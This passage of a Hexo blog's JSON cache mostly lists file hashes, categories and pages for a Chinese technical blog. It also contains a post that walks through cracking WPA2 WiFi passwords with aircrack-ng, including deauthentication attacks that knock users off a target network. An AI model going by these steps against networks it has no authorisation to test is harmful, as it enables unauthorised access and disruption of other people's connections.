6348301422218.jpg","hash":"505adbbe436476d6cfe244fafa7736cdb57a45b7","modified":1673831694342},{"_id":"public/medias/featureimages/girl_kitten_flower_141058_1280x720.jpg","hash":"f8cee3a9e9b1d9a3868d95cc9bfaa7c728f7f4c3","modified":1673831694342},{"_id":"public/medias/featureimages/girl_umbrella_rain_151317_1280x720.jpg","hash":"01b9ac0439d61672e26f552af48d3dcea8a474ed","modified":1673831694342},{"_id":"public/libs/awesome/webfonts/fa-regular-400.svg","hash":"3d3a49445343d80f3b553e3e3425b9a7bd49acaf","modified":1673831694342},{"_id":"public/libs/awesome/webfonts/fa-solid-900.eot","hash":"cab8e84ae5682d1d556e234df9c790985888def8","modified":1673831694342},{"_id":"public/libs/awesome/webfonts/fa-solid-900.ttf","hash":"9521ed12274c2cbc910cea77657116fcf6545da3","modified":1673831694342},{"_id":"public/libs/echarts/echarts.min.js","hash":"9496f386a0da4601cad22c479cc5543913a4d67f","modified":1673831694342},{"_id":"public/medias/avatar.jpg","hash":"09456a1b41efb3093a7e3cca57ca4790b12f9b05","modified":1673831694342},{"_id":"public/medias/banner/0.jpg","hash":"45f61c72d281c694acbed35d71791c55db739265","modified":1675584137389},{"_id":"public/libs/awesome/webfonts/fa-brands-400.svg","hash":"5e2d2a159294576bea69cc3360efb5ffe110ab2d","modified":1673831694342},{"_id":"public/libs/awesome/webfonts/fa-solid-900.svg","hash":"7da88b19e1486f8c968d3cf5ab3f194f01ea17fd","modified":1673831694342},{"_id":"public/medias/banner/4.jpg","hash":"73fc2f15971aa69089345f5a94be284c186a5843","modified":1673831694342},{"_id":"public/medias/banner/5.jpg","hash":"b2309b06560253c878e8a71a24a95c6631a7fc4e","modified":1673831694342},{"_id":"public/medias/banner/6.jpg","hash":"48812e3d4fda9d1aa9b73ba217d23c3b87f33d8b","modified":1673831694342},{"_id":"public/medias/banner/3.jpg","hash":"6da529d56aafd651f663944a7c0b80aa358020c1","modified":1673831694342},{"_id":"public/medias/banner/7.jpg","hash":"1bb095e607f5d5475622af3b940faddffa586895","modified":1673831694342},{"_id":"source/_posts/cloud.md","hash":"42fee0fa7045d104113c6a9b6b5c7df928ef89e4","modified":1683345477910},{"_id":"public/2023/01/15/cloud/index.html","hash":"144031f0c3ac33a936ec52fa0fd43e6b5882bea3","modified":1684753680288},{"_id":"public/categories/杂项/index.html","hash":"017ecad90680a0fd52c1a8a17c41bf5b5b4db422","modified":1684753680288},{"_id":"public/tags/cloud/index.html","hash":"dd5526c35bd98d0a1d5bf80b869d8bc232ef8924","modified":1684753680288},{"_id":"source/_posts/Django基础.md","hash":"f685b475456538c72e5829096d12518ef834224e","modified":1678416962814},{"_id":"source/_posts/Flask基础.md","hash":"753ec5393690eb39ce33b96a6e5bdf82a660fba1","modified":1678416946686},{"_id":"source/_posts/fdfs搭建.md","hash":"26849998c8aebe4d235338f26b343f20422d81cf","modified":1678416954129},{"_id":"source/_posts/git笔记.md","hash":"20916d53d1d18f701e7c888354c3dd18128b1721","modified":1678416938334},{"_id":"source/_posts/mongoDB使用.md","hash":"c5d09696e361ff18184f7c42492c5816787f2985","modified":1678416917477},{"_id":"source/_posts/nginx搭建.md","hash":"6f7ec89a7b53d98204cd159b977de1b3f135f1b3","modified":1678416893597},{"_id":"source/_posts/ngonx-fdfs搭建.md","hash":"e0fe148aef94c7e93e179f4bb6b544ac0abfedd8","modified":1674718726219},{"_id":"source/_posts/pythonWebSocket笔记.md","hash":"4c2865f3bf06b2e51abb5e8a75d7b85c978990ad","modified":1678416802981},{"_id":"source/_posts/python正则.md","hash":"6b5068545e3a0566a0cd08582cca3bb6e870f24d","modified":1678416786495},{"_id":"source/_posts/python装饰器.md","hash":"fd14f5d3fb0a19e70182be43d251a69e48875fab","modified":1678416778476},{"_id":"source/_posts/python进程线程协程.md","hash":"60f0ac96e64f79c13f58866f612ce1a515a92d97","modified":1678416794661},{"_id":"source/_posts/redis基础.md","hash":"deba496f362f09a4cf3c348f433292852220e5f2","modified":1678416770267},{"_id":"source/_posts/迭代器.md","hash":"c88b02d2f1723f6fd7ea4f65d5eadc19e12907ac","modified":1678416650215},{"_id":"source/_posts/闭包.md","hash":"73f84f6752daa92b86db800060c7cfd43a54d34a","modified":1678416702763},{"_id":"public/2023/01/19/mongodb-shi-yong/index.html","hash":"c88db2dde2d7d9f82494627e75bb7e7318be7221","modified":1684753680288},{"_id":"public/2023/01/19/nginx-da-jian/index.html","hash":"4f12f8df078980e4e0568e77aaf56bdc97f8b9cf","modified":1684753680288},{"_id":"public/2023/01/19/ngonx-fdfs-da-jian/index.html","hash":"a9a00999333c52a3379326791ffdbdfb37fd9042","modified":1674718789991},{"_id":"public/2023/01/19/fdfs-da-jian/index.html","hash":"4536bb38074376a69c415fa164718e0b4497fb76","modified":1684753680288},{"_id":"public/2023/01/19/flask-ji-chu/index.html","hash":"a48edb5162e6f739e3b002048991382883c2edec","modified":1684753680288},{"_id":"public/2023/01/19/django-ji-chu/index.html","hash":"8fc857fda233d3d76bb2878d2ea488172f1b25fa","modified":1684753680288},{"_id":"public/2023/01/19/redis-ji-chu/index.html","hash":"e5ed8b93bbaeffefd4725db2658973218e0177e6","modified":1684753680288},{"_id":"public/2023/01/19/git-bi-ji/index.html","hash":"b648a0572359a56c079d61badc2b7b73597b53e7","modified":1684753680288},{"_id":"public/2023/01/19/pythonwebsocket-bi-ji/index.html","hash":"c6f578b52a440426151c49cd4836c8a6f38c5652","modified":1684753680288},{"_id":"public/2023/01/19/python-zheng-ze/index.html","hash":"53f8ec6dea3548f81e5315c37bdb4b67e40b6b21","modified":1684753680288},{"_id":"public/2023/01/19/python-zhuang-shi-qi/index.html","hash":"8ccd355db4391dec28161132f9e70e0d38b25ca2","modified":1684753680288},{"_id":"public/2023/01/19/python-jin-cheng-xian-cheng-xie-cheng/index.html","hash":"ecd64c6ca197d4ca309da74833b8bc054285ea8b","modified":1684753680288},{"_id":"public/2023/01/19/die-dai-qi/index.html","hash":"17cc9887785fa478613704c340d0ef64471c260c","modified":1684753680288},{"_id":"public/2023/01/19/bi-bao/index.html","hash":"9ac06e0992eb6614e6f334a934164e36b2a3d8e4","modified":1684753680288},{"_id":"public/archives/page/2/index.html","hash":"297d8a91061fabf1bdc88825512998c5e22a8715","modified":1684753680288},{"_id":"public/archives/2023/page/2/index.html","hash":"2cd576f87ea7eacea898f18a1fecd52a1e829d7c","modified":1684753680288},{"_id":"public/archives/2023/01/page/2/index.html","hash":"3e4fff7fa46ca04d846468c2fd1b5611f6b5ab92","modified":1684753680288},{"_id":"public/categories/Python/index.html","hash":"ef47b049998073d59f98afce017ca961a3c6b960","modified":1684753680288},{"_id":"public/categories/工具/index.html","hash":"95e7ea375afc05291f053f439bd9cbb6ea93af15","modified":1684753680288},{"_id":"public/categories/db/index.html","hash":"5ff6f99bd8f313e6b7f1f4039e901a718e5c2f93","modified":1684753680288},{"_id":"public/page/2/index.html","hash":"7b533e374cf227654fb4b9c4d0c4f000fc78dd28","modified":1684753680288},{"_id":"public/tags/django/index.html","hash":"b3c6931d34e2a5aaa0163621e9033fa6dedde253","modified":1684753680288},{"_id":"public/tags/flask/index.html","hash":"ee949d95575f1387ef4668a7a081df8d1def26b4","modified":1684753680288},{"_id":"public/tags/fdfs/index.html","hash":"cff8f1491769ba7d942ae59673364702ac624f8a","modified":1684753680288},{"_id":"public/tags/git/index.html","hash":"7c9033ae1661a11ec0cf4b23cb72be27dc8dd5af","modified":1684753680288},{"_id":"public/tags/mongo/index.html","hash":"7489d13c65aad48d193081b1eeb00621e7309999","modified":1684753680288},{"_id":"public/tags/nginx/index.html","hash":"9137f50ecfe44fd2ff2d05c3a67bbdcd63045fdd","modified":1684753680288},{"_id":"public/tags/nginx-fdfs/index.html","hash":"65d6fffc5870e2e111e2db0f72fa377f5adc7e22","modified":1674126515519},{"_id":"public/tags/basic/index.html","hash":"53d247d7c956a2f3709f342487b76b55614525f6","modified":1684753680288},{"_id":"public/tags/redis/index.html","hash":"e77e3f8d99cdc100419abc81aea9ad3328d9f311","modified":1684753680288},{"_id":"themes/hexo-theme-matery/source/libs/others/buble.js","hash":"a387cc14dbce743eabcda5488429533e29d5bf2f","modified":1674187579107},{"_id":"public/libs/others/buble.js","hash":"b92e0ccf4c28547ee56ca9a51d06231e0835edd6","modified":1674187726066},{"_id":"themes/hexo-theme-matery/source/libs/others/popupText.js","hash":"1e265c80d43738d9c12513d0e8659409e92bd277","modified":1674188276220},{"_id":"public/libs/others/popupText.js","hash":"c6007ed242c8374cec4a267ba00c06f3f4828b0f","modified":1674188285977},{"_id":"themes/hexo-theme-matery/source/favicon-ex.png","hash":"c1e0b3f97942dbd8cee452bc3401fa817c097d27","modified":1674100870519},{"_id":"themes/hexo-theme-matery/source/medias/logo-ex.png","hash":"25b46490ec213e615d369ef370475a3477b90e11","modified":1674100870800},{"_id":"public/favicon-ex.png","hash":"c1e0b3f97942dbd8cee452bc3401fa817c097d27","modified":1674227917259},{"_id":"public/medias/logo-ex.png","hash":"25b46490ec213e615d369ef370475a3477b90e11","modified":1674227917259},{"_id":"themes/hexo-theme-matery/source/favicon-ex2.png","hash":"fcc65a610683bcc08434fcb7317d55e88f4cdad6","modified":1674227902122},{"_id":"public/favicon-ex2.png","hash":"fcc65a610683bcc08434fcb7317d55e88f4cdad6","modified":1674228521733},{"_id":"themes/hexo-theme-matery/source/medias/banner/2.jpg","hash":"805468e52dfb48e1961c90a05229b6ae6d0089dd","modified":1674100870753},{"_id":"public/medias/banner/2.jpg","hash":"805468e52dfb48e1961c90a05229b6ae6d0089dd","modified":1674547126602},{"_id":"themes/hexo-theme-matery/source/medias/banner/1-1.jpg","hash":"38bb2b7cb4edae064564e5927da3874afb77348a","modified":1674100870612},{"_id":"public/medias/banner/1-1.jpg","hash":"38bb2b7cb4edae064564e5927da3874afb77348a","modified":1674547215564},{"_id":"source/_posts/mysql导入导出.md","hash":"6cd811f3f47a4838a3fbcabcdba8f234a7ed2bec","modified":1678416909907},{"_id":"source/_posts/分布式事务.md","hash":"b2816ce203017a58cc437e14d98d6905a98732aa","modified":1678416640957},{"_id":"source/_posts/本地事务.md","hash":"24fadc893b2e668d78d4d197ce1ee91c540e9460","modified":1678416712397},{"_id":"public/2023/01/26/fen-bu-shi-shi-wu/index.html","hash":"a9602405bc4b3e7e4b12877ae75bece16d18db31","modified":1684753680288},{"_id":"public/2023/01/26/ben-di-shi-wu/index.html","hash":"8769a40e7102ae5c34c65762a09a353c00e2e88f","modified":1684753680288},{"_id":"public/2023/01/26/mysql-dao-ru-dao-chu/index.html","hash":"90e089cc87c7e2306bb7c5c0bacdbcc47c58df17","modified":1684753680288},{"_id":"public/tags/mysql/index.html","hash":"b8e149e59154db3efd368499efc81dce69a166fe","modified":1684753680288},{"_id":"public/tags/DistributedTransactional/index.html","hash":"55172c277ecee78ecb4921c3d5d1878555934970","modified":1684753680288},{"_id":"public/tags/LocalTransactional/index.html","hash":"c639e617582d6d5d365f41b2efd47909543a1b65","modified":1684753680288},{"_id":"source/_posts/nginx-fdfs搭建.md","hash":"15c3b0dd99d8ca73f437e02e4d3c67cbc598663b","modified":1678416902447},{"_id":"public/2023/01/19/nginx-fdfs-da-jian/index.html","hash":"e110a99c46b129fce3cba51aa0a87d05a166d927","modified":1684753680288},{"_id":"source/_posts/四川物连数智科技.md","hash":"f8ccf75de588734f7136d91b850b0de7a11d9993","modified":1678416592904},{"_id":"themes/hexo-theme-matery/source/medias/images/shengtiyuguan.jpg","hash":"786528c0b261b2ba2c9bd8531b5485190273314f","modified":1675251006153},{"_id":"themes/hexo-theme-matery/source/medias/images/tianfuguangchang.jpg","hash":"7f7de4018f554eb78422d6a112c4f030956c545b","modified":1675251006110},{"_id":"themes/hexo-theme-matery/source/medias/images/taipingyuan.jpg","hash":"e48aff5ab6a155b938f8678229e18660e1b9684e","modified":1675251025854},{"_id":"public/2023/02/01/si-chuan-wu-lian-shu-zhi-ke-ji/index.html","hash":"916f6c575e7aadd1f0536760455402cb75b3ec93","modified":1684753680288},{"_id":"public/categories/指南/index.html","hash":"4bed845d9bf057610d31743f4962cf12d5a86d02","modified":1684753680288},{"_id":"public/archives/2023/02/index.html","hash":"257cd809b778582b15363dac07fc1e07e510bc36","modified":1684753680288},{"_id":"public/tags/面试/index.html","hash":"f64799ba2b8269697abc29807d1c3c16f762da10","modified":1684753680288},{"_id":"public/medias/images/shengtiyuguan.jpg","hash":"786528c0b261b2ba2c9bd8531b5485190273314f","modified":1675256066738},{"_id":"public/medias/images/tianfuguangchang.jpg","hash":"7f7de4018f554eb78422d6a112c4f030956c545b","modified":1675256066738},{"_id":"public/medias/images/taipingyuan.jpg","hash":"e48aff5ab6a155b938f8678229e18660e1b9684e","modified":1675256066738},{"_id":"themes/hexo-theme-matery/source/medias/contact.jpg","hash":"87fd7b8f0526f2f538224eb440fb17e161041b6f","modified":1675341844418},{"_id":"public/medias/contact.jpg","hash":"87fd7b8f0526f2f538224eb440fb17e161041b6f","modified":1675341921282},{"_id":"source/_posts/工作第一天.md","hash":"a8d31327ba9896f6af34ea35c5a74ef2668e1417","modified":1678416631235},{"_id":"source/_posts/八股文.md","hash":"58c92bdbc2071190e1c652e25b8c2989d96deeb6","modified":1678416720603},{"_id":"public/2023/02/21/gong-zuo-di-yi-tian/index.html","hash":"d8e2715a12e5f067eb508115e180b42a429d4112","modified":1684753680288},{"_id":"public/2023/02/14/ba-gu-wen/index.html","hash":"fbf3f27c05ab09b22171b67a0025c8a80d4527ea","modified":1684753680288},{"_id":"public/categories/面试题/index.html","hash":"12ebca30b4e48535436236ee7be5c74312bb13e6","modified":1684753680288},{"_id":"public/categories/ip/index.html","hash":"c1577b4029d6ffb3f5908abefe85408d1812413b","modified":1684753680288},{"_id":"public/tags/linux/index.html","hash":"f770024db051518eac5fe80e57463dbf23f1eab8","modified":1684753680288},{"_id":"source/_posts/pg.md","hash":"7e2be588e0f552ab7077e864ba06eeca16219227","modified":1678416884647},{"_id":"public/2023/02/22/pg/index.html","hash":"483755c62dae281d41e9faae68330b859b03aa39","modified":1684753680288},{"_id":"public/archives/page/3/index.html","hash":"6ac432bd29b8d7274c3f9f70c83ffe56569c3674","modified":1684753680288},{"_id":"public/archives/2023/page/3/index.html","hash":"dcd0de99552ae368f6780796c57f4255ee3758f9","modified":1684753680288},{"_id":"public/categories/sql/index.html","hash":"872d4a64c369b2443127bb3e3ebf1bee6e23db69","modified":1684753680288},{"_id":"public/page/3/index.html","hash":"f5f1ab965706c138bf5d9d55b2866292c7c36300","modified":1684753680288},{"_id":"public/tags/postgresql/index.html","hash":"7affdefb3dc7d96340a2d49f3de4377733c911df","modified":1684753680288},{"_id":"source/_posts/Postgresql安装部署.md","hash":"fe4c02bbf11b7fdb8d41db156e851dee9d1fea97","modified":1678416820197},{"_id":"source/_posts/第三方系统注册.mdd","hash":"286f004e7b77985cba4af0de0206dc5d29b99cb1","modified":1677469675576},{"_id":"public/2023/03/02/postgresql-an-zhuang-bu-shu/index.html","hash":"335d5a9d571b27cd3022526564644a8f5b3ae260","modified":1684753680288},{"_id":"public/archives/2023/03/index.html","hash":"3a151a2adc0781b0fe316e699f193f063686fc48","modified":1684753680288},{"_id":"public/categories/pgsql/index.html","hash":"7a251bdad864ffac738db5648f61981ee623e004","modified":1684753680288},{"_id":"public/tags/db/index.html","hash":"661b3072edc11b558bd0d2b48a07c941fc9dddf9","modified":1684753680288},{"_id":"source/_posts/PostgreSql操作.md","hash":"4ee4912ccf597029eb019fad8de8f4cb9f1ef6e7","modified":1678416812070},{"_id":"public/2023/03/02/postgresql-cao-zuo/index.html","hash":"efae00da69b3512d1a63321bfd551290e4edf3f2","modified":1684753680288},{"_id":"source/_posts/MinIO的搭建与SpringBoot的整合.md","hash":"cad7af433d6d82aab8af363533cbd06ed3897573","modified":1678354531513},{"_id":"source/_posts/ubuntu安装后第一步.md","hash":"9ee0350cf6aec9588ebd213737400d6acbe082a4","modified":1678417450068},{"_id":"source/_posts/pg集群.md","hash":"5d81bf2b26b03e5336a4f3d55cb94e04d411f10a","modified":1678416842906},{"_id":"public/2023/03/09/ubuntu-an-zhuang-hou-di-yi-bu/index.html","hash":"cd3a750c06a8f4ddf00bc4f2577d0065001d2908","modified":1684753680288},{"_id":"public/2023/03/09/minio-de-da-jian-yu-springboot-de-zheng-he/index.html","hash":"9db8b928fd915f509b0be404d9e536ebb67165a9","modified":1684753680288},{"_id":"public/2023/03/06/pg-ji-qun/index.html","hash":"02cdfeef730a7075eb3d7a370059540f1ef645dc","modified":1684753680288},{"_id":"public/categories/ubuntu/index.html","hash":"ba2b7028d448e0d1ebc9ed335be4ec026b4dc88c","modified":1684753680288},{"_id":"public/categories/minio/index.html","hash":"4592e7602d1735ee66872e04609f516de1612875","modified":1684753680288},{"_id":"public/tags/os/index.html","hash":"5d9dc7f7db6555c1dfe06eb11b147be211943117","modified":1684753680288},{"_id":"public/tags/storage/index.html","hash":"33462c84f1e1cb28fd84168fd42306a915afca5a","modified":1684753680288},{"_id":"source/_posts/第三方系统注册.md","hash":"fc4d9dbdf75bf800395b07cc45e4788ed0f660c3","modified":1678416680657},{"_id":"source/_posts/重点数据库.md","hash":"d0adab85677c49dcebd05a3b63f972f130773c7a","modified":1678416576465},{"_id":"public/2023/03/10/chong-dian-shu-ju-ku/index.html","hash":"9238bfada3e86d182d83785e1be6c7c6fd3fd452","modified":1684753680288},{"_id":"public/2023/02/27/di-san-fang-xi-tong-zhu-ce/index.html","hash":"5fd709ad895ae39b15854b3ce3ca79c10349d7ee","modified":1684753680288},{"_id":"public/categories/ruiyun/index.html","hash":"ed56513ee443411bc26be5048efdb5c9cb028dae","modified":1684753680288},{"_id":"public/tags/集群/index.html","hash":"f3f255ef3352bb5899f6cc26fc8177c4eec4b913","modified":1684753680288},{"_id":"public/tags/interface/index.html","hash":"37dbd408aea2a4d59b5871d534d34ac1ad245cec","modified":1684753680288},{"_id":"public/tags/hot/index.html","hash":"a64d2f5d7b3fca43676d7435a19aaa1513801810","modified":1684753680288},{"_id":"source/_posts/minio集群搭建.md","hash":"949a7fc9193a1c4429c88a18ccc97255594969cc","modified":1678951776170},{"_id":"public/2023/03/16/minio-ji-qun-da-jian/index.html","hash":"b859a56be2c3d2a3051c5a3878c5e05a4f1d424a","modified":1684753680288},{"_id":"public/categories/storage/index.html","hash":"1a8639a2c50c061529c52c6fe241615afddd21e3","modified":1684753680288},{"_id":"public/tags/minio/index.html","hash":"283ba760d44c8eb946992dc1d3e78190bfcea15a","modified":1684753680288},{"_id":"source/_posts/ubuntu分区教程.md","hash":"09e65e9f53acdf842456a1145a579041a924e6af","modified":1683671569945},{"_id":"public/2023/05/05/ubuntu-fen-qu-jiao-cheng/index.html","hash":"775dac23b1742fc3c8d2d2a122bfb50db3ae111b","modified":1684753680288},{"_id":"public/archives/2023/05/index.html","hash":"22b0957f3107301b1e9ad85f9aabfeaebc80b01f","modified":1684753680288},{"_id":"source/_posts/Linux安装redis.md","hash":"2a9d7702d5d3146bfcc9a9ff196d7b829c1827cc","modified":1684475617789},{"_id":"source/_posts/Linux安装maven.md","hash":"4965cc9772e7c5ebe776354876ece70c26f8378e","modified":1684475450143},{"_id":"source/_posts/Linux安装nginx.md","hash":"bbe0a0fd71444fb7020a36b6e16b8deab805621f","modified":1684475568886},{"_id":"source/_posts/Linux环境变量配置.md","hash":"c8752f455a9aa5526fb900dad005a9a3856b91ec","modified":1683678233092},{"_id":"source/_posts/SpringSecurity-vue前后端分离.md","hash":"7b331a8e51a405a963415c6d165f6452c185b6ee","modified":1679042314252},{"_id":"public/2023/05/10/linux-an-zhuang-nginx/index.html","hash":"3f059cf5130ac35f97dca128bbe078149a68b1bc","modified":1684753680288},{"_id":"public/2023/05/10/linux-huan-jing-bian-liang-pei-zhi/index.html","hash":"762e2603d409399f2fe6f404c3725f956fb76916","modified":1684753680288},{"_id":"public/2023/05/10/linux-an-zhuang-maven/index.html","hash":"6903cda7523a229d7d533ba4a49f3d35a9149d6b","modified":1684753680288},{"_id":"public/2023/05/10/linux-an-zhuang-redis/index.html","hash":"bf0b19ceda664dd63b01685fb4c0a35248522d94","modified":1684753680288},{"_id":"public/2023/03/17/springsecurity-vue-qian-hou-duan-fen-chi/index.html","hash":"b55edd9a21270b8d9db138c7785b766d682cbc89","modified":1684753680288},{"_id":"public/archives/page/4/index.html","hash":"1bfcc9802c6ba67e3f631436997c9aa4dbc7b992","modified":1684753680288},{"_id":"public/archives/2023/page/4/index.html","hash":"3885114ac57330b86c1c175f529814693fb41f6a","modified":1684753680288},{"_id":"public/categories/spring/index.html","hash":"ab043f127ce101ff3eb5ee329aa60925a470fcc1","modified":1684753680288},{"_id":"public/page/4/index.html","hash":"a42e5e6077842e80531bf169b5f9a3368e937ddc","modified":1684753680288},{"_id":"public/tags/maven/index.html","hash":"32eac9fe14bbf7ab7b60f11d5a6572957c820af4","modified":1684753680288},{"_id":"public/tags/spring-security/index.html","hash":"75c9d94f0c36ed4da0e3c1fd0285746c509d9beb","modified":1684753680288},{"_id":"public/tags/环境变量/index.html","hash":"4abb21ca26e6e927959b9ed72d22335cfed51221","modified":1684753680288},{"_id":"source/_posts/GitHubPages部署Hexo.md","hash":"9e1f6c7318b8d5997d1f9bb45a49bf5f06795d76","modified":1684331446358},{"_id":"public/2023/05/17/githubpages-bu-shu-hexo/index.html","hash":"fd6a8faa7e3f7bd5e73e9916fee8c84fd2dfc926","modified":1684753680288},{"_id":"source/_posts/windows安装nginx.md","hash":"381b305dd2bbefd4917f0462390955ba0286e7b0","modified":1684476378289},{"_id":"public/2023/05/19/windows-an-zhuang-nginx/index.html","hash":"cbcac942ac67d872556d5173adb8398d121e28e4","modified":1684753680288},{"_id":"public/categories/windows/index.html","hash":"ddac08524748b520c649021e867869cba2498f7e","modified":1684753680288},{"_id":"source/_posts/mysql主从复制.md","hash":"ea08b3fa258577735e95605af30f10bcd6d2eda0","modified":1684753660354},{"_id":"public/2023/05/22/mysql-zhu-cong-fu-zhi/index.html","hash":"2d49747701e043b7503bb1d1688af12c6d84b872","modified":1684753680288}],"Category":[{"name":"Linux","_id":"clcy469my0004covg3lxmfaba"},{"name":"博客部署","_id":"clcy469n50009covg09yq6ii2"},{"name":"杂项","_id":"clcy8gll2000114vg0olfcq7q"},{"name":"Python","_id":"cld2uqf6300021svk1v1pfjwo"},{"name":"工具","_id":"cld2uqf6f000c1svk6b245h1i"},{"name":"db","_id":"cld2uqf6t00171svk0o0xg68t"},{"name":"指南","_id":"cldlo7icj0001d4vgh4k58ate"},{"name":"面试题","_id":"cledy5z5l0002g0vg146ta4mz"},{"name":"ip","_id":"cledy5z5w0005g0vgetgv9qwr"},{"name":"sql","_id":"clefqud9z0001rovgdxud5oxo"},{"name":"pgsql","_id":"cleqv9i050001usvgbrnudnj4"},{"name":"ubuntu","_id":"clf0wz5v40002pgvghh2o9h38"},{"name":"minio","_id":"clf0wz5vd0005pgvg1bt523xu"},{"name":"ruiyun","_id":"clf1y563p0004b8vg123pc16n"},{"name":"storage","_id":"clfaofk4d0001ssvgggklbm7b"},{"name":"spring","_id":"clhgy9swm000f0gvga3oc4w9d"},{"name":"windows","_id":"clhu5r21b0001ygvg53zgbp8n"}],"Data":[],"Page":[{"title":"404","date":"2023-01-15T08:05:33.000Z","type":"404","layout":"404","description":"Oops～，你来到了没有知识的荒原 :(","_content":"","source":"404.md","raw":"---\ntitle: 404\ndate: 2023-01-15 16:05:33\ntype: \"404\"\nlayout: \"404\"\ndescription: \"Oops～，你来到了没有知识的荒原 :(\"\n---","updated":"2023-01-15T21:48:00.411Z","path":"404.html","comments":1,"_id":"clcy469mi0000covg9qyj6nw8","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"about","date":"2023-01-15T09:25:30.000Z","type":"about","layout":"about","_content":"","source":"about/index.md","raw":"---\ntitle: about\ndate: 2023-01-15 17:25:30\ntype: \"about\"\nlayout: \"about\"\n---","updated":"2023-01-15T21:48:00.412Z","path":"about/index.html","comments":1,"_id":"clcy469mt0002covgb4rf3jk5","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"categories","date":"2023-01-15T09:25:30.000Z","type":"categories","layout":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: categories\ndate: 2023-01-15 17:25:30\ntype: \"categories\"\nlayout: \"categories\"\n---\n","updated":"2023-01-15T21:48:00.412Z","path":"categories/index.html","comments":1,"_id":"clcy469n10006covg28npehaq","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"tags","date":"2023-01-15T10:23:38.000Z","type":"tags","layout":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: tags\ndate: 2023-01-15 18:23:38\ntype: \"tags\"\nlayout: \"tags\"\n---\n","updated":"2023-01-15T21:48:00.412Z","path":"tags/index.html","comments":1,"_id":"clcy469n40008covg34w9hev7","content":"","site":{"data":{}},"excerpt":"","more":""}],"Post":[{"title":"wifi密码破解","top":false,"cover":false,"toc":true,"mathjax":true,"date":"2023-01-15T22:29:43.000Z","password":"5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87","summary":"Wifi密码暴力破解，不一定成功","_content":"\n### aircrack-ng工具安装\n> 如果你是Kali用户，那么可以跳过这一步，Kali自带，我们以Ubuntu为例：\n```shell\nsudo apt install aircrack-ng # 安装aircrack-ng 这个工具kali-linux默认安装了\n```\n\n### 查看无线网卡\n```shell\nairmon-ng # 查看可用的无线网卡一般以`w`开头\n```\n\n### 开启监听模式\n```shell\nairmon-ng start <网卡名称> # 指定无线网卡开启监听模式\n```\n\n### 扫描附近的无线网\n```shell\nairodump-ng <处于监听模式的网卡名称> # 用这个监听网卡扫描附近的无线网络\n\n# airodump-ng wlp8s0mon\n# BSSID: 无线 AP 的硬件地址\n# PWR: 信号强度，值是负数，绝对值越小表示信号越强\n# CH: 无线网络信道\n# ENC: 加密方式，我们要破解的是 WPA2\n# ESSID: 无线网络的名称\n```\n\n### 监听你想破解的无线网\n```shell\nairodump-ng -w <扫描结果保存的文件名> -c <无线网络信道> --bssid <目标无线 AP 的硬件地址> <处于监听模式的网卡名称> # 使用参数过滤扫描列表，确定扫描目标,可以出指定wifi哪些人在使用 只要有人链接这个wifi就会被抓包\n\n# BSSID: 无线 AP 的硬件地址\n# STATION: 用户设备的硬件地址\n```\n\n### 对无线AP或者用户设备发起ACK攻击\n```shell\naireplay-ng -<攻击模式(0为下线)> <攻击次数(0为一直攻击)> -a 无线 AP 硬件地址> -c <用户设备硬件地址> <处于监听模式的网卡名称> # 使用 aireplay-ng 对目标设备发起ack攻击 让他强制下线 方便他重新链接抓包成功\n\naireplay-ng -<攻击模式(0为下线)> <攻击次数(0为一直攻击)> -a 无线 AP 硬件地址> <处于监听模式的网卡名称> # 使用 aireplay-ng 对无线AP设备发起ack攻击 让连接他的设备都下线 方便他重新链接抓包成功\n```\n\n### 破解密码\n```shell\naircrack-ng -w 密码字典 <包含握手包的 cap 文件> # 使用 aircrack-ng 暴力破解 Wi-Fi 密码 成功会返回 KEY FOUND! 密码字典去网上下载多得很 \n```\n\n### 退出监听模式，连接无线网\n```shell\nairmon-ng stop <处于监听模式的无限网卡名称> # 无线网卡退出监听模式\n```\n\n### 使用命令连接网络\n```shell\nsudo systemctl start NetworkManager # 开启网络服务\n\nip addr 或者 ifconfig # 查看无线网卡名称(w开头得)\n\niwlist 无线网卡 scanning | grep -i essid # 扫描可用wifi\n\nnmcli device wifi connect wifi名字 password wifi密码 ifname 无线网卡 # 用这个无线网卡链接指定wifi\n```\n\n### 卸载ubuntu系统的IO驱动，不让别人乱碰你得电脑\n```shell\nsudo apt install xserver-xorg-input-all # 安装\n\nsudo apt autoremove xserver-xorg-input-all # 卸载\n```\n\n","source":"_posts/wifi密码破解.md","raw":"---\ntitle: wifi密码破解\ntop: false\ncover: false\ntoc: true\nmathjax: true\ndate: 2023-01-16 06:29:43\npassword: 5c4aaf271c7c13b2372e84982f82f2cd279026950438dfc769c95dcabdfd2a87\nsummary: Wifi密码暴力破解，不一定成功\ntags: wifi\ncategories: Linux\n---\n\n### aircrack-ng工具安装\n> 如果你是Kali用户，那么可以跳过这一步，Kali自带，我们以Ubuntu为例：\n```shell\nsudo apt install aircrack-ng # 安装aircrack-ng 这个工具kali-linux默认安装了\n```\n\n### 查看无线网卡\n```shell\nairmon-ng # 查看可用的无线网卡一般以`w`开头\n```\n\n### 开启监听模式\n```shell\nairmon-ng start <网卡名称> # 指定无线网卡开启监听模式\n```\n\n### 扫描附近的无线网\n```shell\nairodump-ng <处于监听模式的网卡名称> # 用这个监听网卡扫描附近的无线网络\n\n# airodump-ng wlp8s0mon\n# BSSID: 无线 AP 的硬件地址\n# PWR: 信号强度，值是负数，绝对值越小表示信号越强\n# CH: 无线网络信道\n# ENC: 加密方式，我们要破解的是 WPA2\n# ESSID: 无线网络的名称\n```\n\n### 监听你想破解的无线网\n```shell\nairodump-ng -w <扫描结果保存的文件名> -c <无线网络信道> --bssid <目标无线 AP 的硬件地址> <处于监听模式的网卡名称> # 使用参数过滤扫描列表，确定扫描目标,可以出指定wifi哪些人在使用 只要有人链接这个wifi就会被抓包\n\n# BSSID: 无线 AP 的硬件地址\n# STATION: 用户设备的硬件地址\n```\n\n### 对无线AP或者用户设备发起ACK攻击\n```shell\naireplay-ng -<攻击模式(0为下线)> <攻击次数(0为一直攻击)> -a 无线 AP 硬件地址> -c <用户设备硬件地址> <处于监听模式的网卡名称> # 使用 aireplay-ng 对目标设备发起ack攻击 让他强制下线 方便他重新链接抓包成功\n\naireplay-ng -<攻击模式(0为下线)> <攻击次数(0为一直攻击)> -a 无线 AP 硬件地址> <处于监听模式的网卡名称> # 使用 aireplay-ng 